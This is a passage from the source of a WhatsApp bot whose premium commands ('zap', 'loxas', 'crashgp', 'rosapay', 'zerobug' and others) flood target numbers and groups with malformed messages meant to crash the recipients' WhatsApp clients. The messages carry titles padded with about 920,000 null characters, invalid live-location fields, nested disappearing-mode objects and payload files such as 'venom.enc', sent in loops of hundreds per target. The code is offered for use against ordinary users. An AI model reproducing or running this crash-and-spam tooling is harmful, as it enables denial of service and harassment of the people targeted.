						await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" ") + "\n\n𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length == 0) {
						await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length == 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					}
				} else if (db.data.settings[botNumber].autoButton) {
					for (const x of listgroup) {
						sections.push({
							"title": x.subject,
							"id": `${prefix + command} ${x.id}`
						})
					}
					VxoZap.sendButtons(m.chat, {
						"body": "LIST GROUP",
						"title": "𝐎𝐏𝐓𝐈𝐎𝐍𝐒",
						"footer": "⿻ ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 ⌟ ⿻",
						sections
					}, {
						quoted: Zets
					})
				} else {
					zreply(`Example : ${prefix + command} 120###@g.us`)
				}
			}
			break
			case "zap": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				if (input.length == 0) return zreply("_Reply/Tag/Nomer_")
				const failed = []
				const count = text.split("|")[1]
				if (!count)
					return zreply(`*Syntax Error!*\n\n_Use : Zap No|Amount Spam_\n_Example : Zap 62xx|1_\n\n\n_~Amount Spam~_\n1 = 100×\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				if (isNaN(count)) return zreply("Hanya Bisa Angka!!")
				if (Number(count) < 1) return zreply("Minimal 1")
				await zreply(mess.bugrespon)
				for (const x of input) {
					if ((await VxoZap.onWhatsApp(x)).length > 0 &&
						!owner.includes(x.split("@")[0]) &&
						!kontributor.includes(x.split("@")[0]) &&
						x.split("@")[0] !== Creator &&
						x !== botNumber) {
						for (let j = 0; j < (Number(count) * 100); j++) {
							await PayMent(x)
							await NewsletterZap(x)
						}
					} else {
						failed.push(x)
					}
				}
				const successList = input.filter(x => !failed.includes(x))
				const failedList = input.filter(x => failed.includes(x))
				if (successList.length > 0 && failedList.length > 0) {
					await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						successList.map(x => "@" + x.split("@")[0]).join(" ") +
						"\n\n𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						failedList.map(x => "@" + x.split("@")[0]).join(" "))
				} else if (successList.length > 0) {
					await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						successList.map(x => "@" + x.split("@")[0]).join(" "))
				} else if (failedList.length > 0) {
					await zreply("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						failedList.map(x => "@" + x.split("@")[0]).join(" "))
				}
			}
			break
			case 'loxas': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				if (input.length == 0) return zreply("_Reply/Tag/Nomer_")
				const failed = []
				const count = text.split("|")[1]
				if (!count)
					return zreply(`*Syntax Error!*\n\n_Use : Loxas No|Amount Spam_\n_Example : Loxas 62xx|1_\n\n\n_~Amount Spam~_\n1 = 100×\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				if (isNaN(count)) return zreply("Hanya Bisa Angka!!")
				if (Number(count) < 1) return zreply("Minimal 1")
				await zreply(mess.bugrespon)
				for (const x of input) {
					if ((await VxoZap.onWhatsApp(x)).length > 0 &&
						!owner.includes(x.split("@")[0]) &&
						!kontributor.includes(x.split("@")[0]) &&
						x.split("@")[0] !== Creator &&
						x !== botNumber) {
						for (let j = 0; j < (Number(count) * 100); j++) {
							const dJ = {
								text: '\u231B',
								key: m.key
							};
							const dK = {
								react: dJ
							};
							await VxoZap.sendMessage(x, dK);
							await sleep(100);
							const dL = {
								text: 'foi o ' + pushname + ' tá ?'
							};
							await VxoZap.sendMessage(x, dL);
							// Mengirim beberapa pesan berulang kali
							for (let eC = 0; eC < 8; eC++) {
								const eK = {
									text: '\n'.repeat(100) // Mengirim pesan dengan banyak baris kosong
								};
								const eL = {
									extendedTextMessage: eK
								};
								await VxoZap.relayMessage(x, eL, {});
								const eM = {
									product_header_info_id: 292928282928,
									product_header_is_rejected: false
								};
								await VxoZap.relayMessage(
									x, {
										listMessage: {
											title: '\u27E0\u2FFB \uD835\uDC02\uD835\uDC0B͢\uD835\uDC22\uD835\uDEB5\uD835\uDC0D͢\uD835\uDC13 々' + '\0'.repeat(920000),
											footerText: 'ʀѻรค мєรรคgє ๒ยﻮ\u2705\u20DF\u256E',
											description: 'ʀѻรค мєรรคgє ๒ยﻮ\u2705\u20DF\u256E',
											buttonText: null,
											listType: 2,
											productListInfo: {
												productSections: [{
													title: 'aaaaa',
													products: [{
														productId: '4392524570816732'
													}]
												}],
												productListHeaderImage: {
													productId: '4392524570816732',
													jpegThumbnail: null
												},
												businessOwnerJid: '0@s.whatsapp.net'
											}
										},
										footer: 'aaaa',
										contextInfo: {
											expiration: 604800,
											ephemeralSettingTimestamp: '1679959486',
											entryPointConversionSource: 'global_search_new_chat',
											entryPointConversionApp: 'whatsapp',
											entryPointConversionDelaySeconds: 9,
											disappearingMode: {
												initiator: 'INITIATED_BY_ME'
											}
										},
										selectListType: 2,
										product_header_info: eM,
									}, {}
								);
								await sleep(50);

								const eG = {
									degreesLatitude: 'a',
									degreesLongitude: 'a',
									caption: 'Sr.Bruxo.Mp5 ?',
									url: cP,
									sequenceNumber: '1678556734042001',
									jpegThumbnail: TheZhiro,
									expiration: 7776000,
									ephemeralSettingTimestamp: '1677306667',
									disappearingMode: {
										initiator: 'INITIATED_BY_ME',
										inviteLinkGroupTypeV2: 'DEFAULT',
										messageContextInfo: {
											deviceListMetadata: {
												senderTimestamp: '1678285396',
												recipientKeyHash: 'SV5H7wGIOXqPtg==',
												recipientTimestamp: '1678496731',
												deviceListMetadataVersion: 2
											}
										}
									}
								};
								const eH = {
									liveLocationMessage: eG
								};
								const eI = {
									message: eH
								};
								const eJ = {
									viewOnceMessage: eI
								};
								await VxoZap.relayMessage(x, eJ, {});
								await sleep(50);
							}
							await sleep(50);
							const dM = {
								text: '\u2705',
								key: m.key
							};
							const dN = {
								react: dM
							};
							await VxoZap.sendMessage(x, dN);
							await sleep(50);
						}
					} else {
						failed.push(x)
					}
				}
				const successList = input.filter(x => !failed.includes(x))
				const failedList = input.filter(x => failed.includes(x))
				if (successList.length > 0 && failedList.length > 0) {
					await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						successList.map(x => "@" + x.split("@")[0]).join(" ") +
						"\n\n𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						failedList.map(x => "@" + x.split("@")[0]).join(" "))
				} else if (successList.length > 0) {
					await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						successList.map(x => "@" + x.split("@")[0]).join(" "))
				} else if (failedList.length > 0) {
					await zreply("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						failedList.map(x => "@" + x.split("@")[0]).join(" "))
				}
				zreply('> Success >.<')
			}
			break
			case "bugcomunity": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				if (input.length == 0) return zreply("_Reply/Tag/Nomer_")
				const failed = []
				const count = text.split("|")[1]
				if (!count)
					return zreply(`*Syntax Error!*\n\n_Use : bugcomunity No|Amount Spam_\n_Example : bugcomunity 62xx|1_\n\n\n_~Amount Spam~_\n1 = 100×\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				if (isNaN(count)) return zreply("Hanya Bisa Angka!!")
				if (Number(count) < 1) return zreply("Minimal 1")
				await zreply(mess.bugrespon)
				for (const x of input) {
					if ((await VxoZap.onWhatsApp(x)).length > 0 &&
						!owner.includes(x.split("@")[0]) &&
						!kontributor.includes(x.split("@")[0]) &&
						x.split("@")[0] !== Creator &&
						x !== botNumber) {
						for (let j = 0; j < (Number(count) * 100); j++) {
							var msg = generateWAMessageFromContent(text, proto.Message.fromObject({
								groupInviteMessage: {
									groupJid: "1234567890@g.us",
									inviteCode: "abcdefg",
									inviteExpiration: Date.now() + 86400000,
									groupName: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉" + "\u0000".repeat(900000),
									thumbnail: fs.readFileSync(`./virtex/venom.enc`),
									caption: "VenomZin Bug",
									groupType: 1,
								}
							}), {
								userJid: text,
								quoted: m
							})
							VxoZap.relayMessage(text, msg.message, {
								messageId: msg.key.id
							})
						}
					} else {
						failed.push(x)
					}
				}
				const successList = input.filter(x => !failed.includes(x))
				const failedList = input.filter(x => failed.includes(x))
				if (successList.length > 0 && failedList.length > 0) {
					await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						successList.map(x => "@" + x.split("@")[0]).join(" ") +
						"\n\n𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						failedList.map(x => "@" + x.split("@")[0]).join(" "))
				} else if (successList.length > 0) {
					await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						successList.map(x => "@" + x.split("@")[0]).join(" "))
				} else if (failedList.length > 0) {
					await zreply("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						failedList.map(x => "@" + x.split("@")[0]).join(" "))
				}
				zreply('> Success >.<')
			}
			break
			case "convite": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Convite Number_\n_Example : Convite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				if (!isNaN(parseInt(text)) && text.endsWith("@g.us")) {
					zreply(mess.bugrespon)
					for (let jamok = 10; jamok !== 0; jamok -= 1) {
						try {
							var msg = generateWAMessageFromContent(text, proto.Message.fromObject({
								groupInviteMessage: {
									groupJid: "1234567890@g.us",
									inviteCode: "abcdefg",
									inviteExpiration: Date.now() + 86400000,
									groupName: "" + telapreta3,
									thumbnail: fs.readFileSync(`./system/image/venom.enc`),
									caption: "VenomZin Bug",
									groupType: 1,
								}
							}), {
								userJid: text,
								quoted: m
							})
							VxoZap.relayMessage(text, msg.message, {
								messageId: msg.key.id
							})
						} catch (error) {
							console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ ERROR ]"), error)
						}
					}
					zreply("Success send bug")
				} else if (input.length > 0) {
					const failed = []
					await zreply(mess.bugrespon)
					for (const x of input) {
						if ((await VxoZap.onWhatsApp(x)).length > 0 && !owner.includes(x.split("@")[0]) && !kontributor.includes(x.split("@")[0]) && x.split("@")[0] !== Creator && x !== botNumber) {
							for (let jamok = 10; jamok !== 0; jamok -= 1) {
								try {
									var msg = generateWAMessageFromContent(x, proto.Message.fromObject({
										groupInviteMessage: {
											groupJid: "1234567890@g.us",
											inviteCode: "abcdefg",
											inviteExpiration: Date.now() + 86400000,
											groupName: "" + telapreta3,
											thumbnail: fs.readFileSync(`./system/image/venom.enc`),
											caption: "VenomZin Bug",
											groupType: 1,
										}
									}), {
										userJid: x,
										quoted: m
									})
									VxoZap.relayMessage(x, msg.message, {
										messageId: msg.key.id
									})
								} catch (error) {
									console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ ERROR ]"), error)
								}
							}
						} else {
							failed.push(x)
						}
					}
					if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("Success send bug to " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" ") + "\n\nFailed send bug to " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length == 0) {
						await zreply("Success send bug to " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length == 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("Failed send bug to " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					}
				} else if (db.data.settings[botNumber].autoButton) {
					for (const x of listgroup) {
						sections.push({
							"title": x.subject,
							"id": `${prefix + command} ${x.id}`
						})
					}
					VxoZap.sendButtons(m.chat, {
						"body": "LIST GROUP",
						"title": "OPTIONS",
						"footer": "⿻  ⌜ Zero Execution Vault ⌟  ⿻",
						sections
					}, {
						quoted: qdoc
					})
				} else {
					zreply(`Example : ${prefix + command} 120###@g.us`)
				}
			}
			break
			case "rosapay": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Rosapay Number_\n_Example : Rosapay 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				const sections = []
				const listgroup = await VxoZap.getAllGroups(true)
				if (!isNaN(parseInt(text)) && text.endsWith("@g.us")) {
					zreply(mess.bugrespon)
					for (let j = 0; j < 30; j++) {
						try {
							const eX = {
								product_header_info_id: 11606125976,
								product_header_is_rejected: false,
							}
							await VxoZap.relayMessage(text, {
								listMessage: {
									title: "\u27E0\u2FFB \uD835\uDC02\uD835\uDC0B͢\uD835\uDC22\uD835\uDEB5\uD835\uDC0D͢\uD835\uDC13 々" + "\0".repeat(919680),
									footerText: "ʀѻรค мєรรคgє ๒ยﻮ\u2705\u20DF\u256E",
									description: "ʀѻรค мєรรคgє ๒ยﻮ\u2705\u20DF\u256E",
									buttonText: null,
									listType: 2,
									productListInfo: {
										productSections: [{
											title: "aaaaa",
											products: [{
												productId: "4392524570816732"
											}],
										}],
										productListHeaderImage: {
											productId: "4392524570816732",
											jpegThumbnail: null,
										},
										businessOwnerJid: "0@s.whatsapp.net",
									},
									contextInfo: {
										isForwarded: true,
										fromMe: true,
										participant: m.sender,
										remoteJid: text,
										forwardedNewsletterMessageInfo: {
											newsletterJid: "120363298121669193@newsletter",
											serverMessageId: 1,
											newsletterName: "\uD835\uDD87 \uD835\uDD97 \uD835\uDD9A \uD835\uDD9D \uD835\uDD8A \uD835\uDD91 \uD835\uDD86 \uD835\uDD98\u2003\u2003\u263F" + telapreta3 + telapreta3,
										}
									}
								},
								footer: "aaaa",
								contextInfo: {
									expiration: 620000,
									ephemeralSettingTimestamp: "1679959486",
									entryPointConversionSource: "global_search_new_chat",
									entryPointConversionApp: "whatsapp",
									entryPointConversionDelaySeconds: 9,
									disappearingMode: {
										initiator: "INITIATED_BY_ME"
									},
								},
								selectListType: 2,
								product_header_info: eX,
							}, {})
							const eY = {
								degreesLatitude: "a",
								degreesLongitude: "a",
								caption: "Sr.Bruxo.Mp5 ?",
								url: cP,
								sequenceNumber: "1678556734042001",
								jpegThumbnail: TheZhiro,
								expiration: 7776000,
								ephemeralSettingTimestamp: "1677306667",
								disappearingMode: {},
							}
							eY.disappearingMode.initiator = "INITIATED_BY_ME"
							eY.disappearingMode.inviteLinkGroupTypeV2 = "DEFAULT"
							eY.disappearingMode.messageContextInfo = {}
							eY.disappearingMode.messageContextInfo.deviceListMetadata = {}
							eY.disappearingMode.messageContextInfo.deviceListMetadata.senderTimestamp = "1678285396"
							eY.disappearingMode.messageContextInfo.deviceListMetadata.recipientKeyHash = "SV5H7wGIOXqPtg=="
							eY.disappearingMode.messageContextInfo.deviceListMetadata.recipientTimestamp = "1678496731"
							eY.disappearingMode.messageContextInfo.deviceListMetadata.deviceListMetadataVersion = 2
							const eZ = {
								liveLocationMessage: eY
							}
							const f0 = {
								message: eZ
							}
							const f1 = {
								viewOnceMessage: f0
							}
							await VxoZap.relayMessage(text, f1, {})
						} catch (error) {
							console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ ERROR ]"), error)
						}
					}
					zreply("Success send bug")
				} else if (input.length > 0) {
					const failed = []
					await zreply(mess.bugrespon)
					for (const x of input) {
						if ((await VxoZap.onWhatsApp(x)).length > 0 && !owner.includes(x.split("@")[0]) && !kontributor.includes(x.split("@")[0]) && x.split("@")[0] !== Creator && x !== botNumber) {
							for (let j = 0; j < 30; j++) {
								try {
									const eX = {
										product_header_info_id: 11606125976,
										product_header_is_rejected: false,
									}
									await VxoZap.relayMessage(x, {
										listMessage: {
											title: "\u27E0\u2FFB \uD835\uDC02\uD835\uDC0B͢\uD835\uDC22\uD835\uDEB5\uD835\uDC0D͢\uD835\uDC13 々" + "\0".repeat(919680),
											footerText: "ʀѻรค мєรรคgє ๒ยﻮ\u2705\u20DF\u256E",
											description: "ʀѻรค мєรรคgє ๒ยﻮ\u2705\u20DF\u256E",
											buttonText: null,
											listType: 2,
											productListInfo: {
												productSections: [{
													title: "aaaaa",
													products: [{
														productId: "4392524570816732"
													}],
												}],
												productListHeaderImage: {
													productId: "4392524570816732",
													jpegThumbnail: null,
												},
												businessOwnerJid: "0@s.whatsapp.net",
											},
											contextInfo: {
												isForwarded: true,
												fromMe: true,
												participant: m.sender,
												remoteJid: x,
												forwardedNewsletterMessageInfo: {
													newsletterJid: "120363298121669193@newsletter",
													serverMessageId: 1,
													newsletterName: "\uD835\uDD87 \uD835\uDD97 \uD835\uDD9A \uD835\uDD9D \uD835\uDD8A \uD835\uDD91 \uD835\uDD86 \uD835\uDD98\u2003\u2003\u263F" + telapreta3 + telapreta3,
												}
											}
										},
										footer: "aaaa",
										contextInfo: {
											expiration: 620000,
											ephemeralSettingTimestamp: "1679959486",
											entryPointConversionSource: "global_search_new_chat",
											entryPointConversionApp: "whatsapp",
											entryPointConversionDelaySeconds: 9,
											disappearingMode: {
												initiator: "INITIATED_BY_ME"
											},
										},
										selectListType: 2,
										product_header_info: eX,
									}, {})
									const eY = {
										degreesLatitude: "a",
										degreesLongitude: "a",
										caption: "Sr.Bruxo.Mp5 ?",
										url: cP,
										sequenceNumber: "1678556734042001",
										jpegThumbnail: TheZhiro,
										expiration: 7776000,
										ephemeralSettingTimestamp: "1677306667",
										disappearingMode: {},
									}
									eY.disappearingMode.initiator = "INITIATED_BY_ME"
									eY.disappearingMode.inviteLinkGroupTypeV2 = "DEFAULT"
									eY.disappearingMode.messageContextInfo = {}
									eY.disappearingMode.messageContextInfo.deviceListMetadata = {}
									eY.disappearingMode.messageContextInfo.deviceListMetadata.senderTimestamp = "1678285396"
									eY.disappearingMode.messageContextInfo.deviceListMetadata.recipientKeyHash = "SV5H7wGIOXqPtg=="
									eY.disappearingMode.messageContextInfo.deviceListMetadata.recipientTimestamp = "1678496731"
									eY.disappearingMode.messageContextInfo.deviceListMetadata.deviceListMetadataVersion = 2
									const eZ = {
										liveLocationMessage: eY
									}
									const f0 = {
										message: eZ
									}
									const f1 = {
										viewOnceMessage: f0
									}
									await VxoZap.relayMessage(x, f1, {})
								} catch (error) {
									console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ ERROR ]"), error)
								}
							}
						} else {
							failed.push(x)
						}
					}
					if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("Success send bug to " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" ") + "\n\nFailed send bug to " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length == 0) {
						await zreply("Success send bug to " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length == 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("Failed send bug to " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					}
				} else if (db.data.settings[botNumber].autoButton) {
					for (const x of listgroup) {
						sections.push({
							"title": x.subject,
							"id": `${prefix + command} ${x.id}`
						})
					}
					VxoZap.sendButtons(m.chat, {
						"body": "LIST GROUP",
						"title": "OPTIONS",
						"footer": "⿻  ⌜ Zero Execution Vault ⌟  ⿻",
						sections
					}, {
						quoted: qdoc
					})
				} else {
					zreply(`Example : ${prefix + command} 120###@g.us`)
				}
			}
			break
			//=================================================//
			case "convite-nova": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Convite-nova Number_\n_Example : Convite-nova 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				const sections = []
				const listgroup = await VxoZap.getAllGroups(true)
				if (!isNaN(parseInt(text)) && text.endsWith("@g.us")) {
					VxoZap.relayMessage(text, {
						newsletterAdminInviteMessage: {
							newsletterJid: "120363228076620557@newsletter",
							newsletterName: "\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51" + convite,
							caption: "ؙ\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51\n" + bugpdf + bugpdf,
							inviteExpiration: "0",
						},
					}, {
						quoted: m
					})
					zreply("Success send bug")
				} else if (input.length > 0) {
					const failed = []
					await zreply(mess.bugrespon)
					for (const x of input) {
						if ((await VxoZap.onWhatsApp(x)).length > 0 && !owner.includes(x.split("@")[0]) && !kontributor.includes(x.split("@")[0]) && x.split("@")[0] !== Creator && x !== botNumber) {
							try {
								VxoZap.relayMessage(x, {
									newsletterAdminInviteMessage: {
										newsletterJid: "120363228076620557@newsletter",
										newsletterName: "\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51" + convite,
										caption: "ؙ\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51\n" + bugpdf + bugpdf,
										inviteExpiration: "0",
									}
								}, {
									quoted: m
								})
							} catch (error) {
								console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ ERROR ]"), error)
							}
						} else {
							failed.push(x)
						}
					}
					if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("Success send bug to " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" ") + "\n\nFailed send bug to " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length == 0) {
						await zreply("Success send bug to " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					} else if (input.filter((x) => !failed.includes(x)).length == 0 && input.filter((x) => failed.includes(x)).length > 0) {
						await zreply("Failed send bug to " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
					}
				} else if (db.data.settings[botNumber].autoButton) {
					for (const x of listgroup) {
						sections.push({
							"title": x.subject,
							"id": `${prefix + command} ${x.id}`
						})
					}
					VxoZap.sendButtons(m.chat, {
						"body": "LIST GROUP",
						"title": "OPTIONS",
						"footer": "⿻  ⌜ Zero Execution Vault ⌟  ⿻",
						sections
					}, {
						quoted: qdoc
					})
				} else {
					zreply(`Example : ${prefix + command} 120###@g.us`)
				}
			}
			break
			//=================================================//
			case "crashgp": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				if (input.length == 0) return zreply("_Reply/Tag/Nomer_")
				const failed = []
				const count = text.split("|")[1]
				if (!count)
					return zreply(`*Syntax Error!*\n\n_Use : Crashgp No|Amount Spam_\n_Example : Crashgp 62xx|1_\n\n\n_~Amount Spam~_\n1 = 100×\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				if (isNaN(count)) return zreply("Hanya Bisa Angka!!")
				if (Number(count) < 1) return zreply("Minimal 1")
				await zreply(mess.bugrespon)
				for (const x of input) {
					if ((await VxoZap.onWhatsApp(x)).length > 0 &&
						!owner.includes(x.split("@")[0]) &&
						!kontributor.includes(x.split("@")[0]) &&
						x.split("@")[0] !== Creator &&
						x !== botNumber) {
						for (let j = 0; j < (Number(count) * 100); j++) {
							const options = {
								requestPhoneNumberMessage: {
									contextInfo: {
										expiration: 86400,
										ephemeralSettingTimestamp: "1677332025",
										disappearingMode: {
											initiator: "INITIATED_BY_OTHER",
											expiration: 86400,
											ephemeralSettingTimestamp: "1677332025",
											disappearingMode: {
												initiator: "INITIATED_BY_OTHER",
											}
										}
									}
								}
							}
							const jamok = await VxoZap.relayMessage(text, options, {
								messageId: null
							})
							const msg = {
								key: {
									remoteJid: m.key.remoteJid,
									participant: m.sender,
									id: jamok
								},
								message: {
									requestPhoneNumberMessage: {
										type: "SHARE_PHONE_NUMBER"
									}
								}
							}
							VxoZap.sendMessage(text, {
								text: "BACOT PEPEK."
							}, {
								quoted: msg
							})
						}
					} else {
						failed.push(x)
					}
				}
				const successList = input.filter(x => !failed.includes(x))
				const failedList = input.filter(x => failed.includes(x))
				if (successList.length > 0 && failedList.length > 0) {
					await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						successList.map(x => "@" + x.split("@")[0]).join(" ") +
						"\n\n𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						failedList.map(x => "@" + x.split("@")[0]).join(" "))
				} else if (successList.length > 0) {
					await zreply("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						successList.map(x => "@" + x.split("@")[0]).join(" "))
				} else if (failedList.length > 0) {
					await zreply("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 " +
						failedList.map(x => "@" + x.split("@")[0]).join(" "))
				}
			}
			break
			case "zerobug": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isPremium) return zreply(mess.premium)
				if (input.length == 0) return zreply("Reply/Tag/nomer")
				const failed = []
				await zreply(mess.bugrespon)
				for (const x of input) {
					if ((await VxoZap.onWhatsApp(x)).length > 0 && !owner.includes(x.split("@")[0]) && !kontributor.includes(x.split("@")[0]) && x.split("@")[0] !== Creator && x !== botNumber) {
						for (let j = 0; j < 30; j++) {
							await BLEKING(x, PORKE2)
							await LIVELOK(x, PORKE)
							await VIRDOK(x, PORKE)
							await BLEKING(x, PORKE2)
							await LIVELOK(x, PORKE)
							await VIRDOK(x, PORKE)
							await BLEKING(x, PORKE2)
							await LIVELOK(x, PORKE)
							await VIRDOK(x, PORKE)
							await BLEKING(x, PORKE2)
							await LIVELOK(x, PORKE)
							await VIRDOK(x, PORKE)
							await BLEKING(x, PORKE2)
							await LIVELOK(x, PORKE)
							await VIRDOK(x, PORKE)
							await BLEKING(x, PORKE2)
							await LIVELOK(x, PORKE)
							await VIRDOK(x, PORKE)
							await BLEKING(x, PORKE2)
							await LIVELOK(x, PORKE)
							await VIRDOK(x, PORKE)
							await BLEKING(x, PORKE2)
